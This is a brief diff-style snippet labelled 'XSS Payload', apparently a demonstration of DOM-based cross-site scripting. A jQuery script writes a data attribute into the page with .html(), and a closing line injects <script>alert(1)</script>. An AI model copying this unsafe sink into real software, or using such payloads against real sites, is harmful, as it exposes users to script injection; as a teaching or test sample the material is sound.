@@ -1,0 +1,14 @@
+<!-- BEGIN: XSS Payload -->
+<div data-role="button" data-text="I am a button"></div>
+<!-- END: XSS Payload -->
+[...]
+<script type="text/javascript">
+    var buttons = $("[data-role=button]");
+    buttons.html(buttons.attr("data-text"));
+</script>
+
+
+<div data-role="button" ... ><script>alert(1)</script></div>
+
+
+
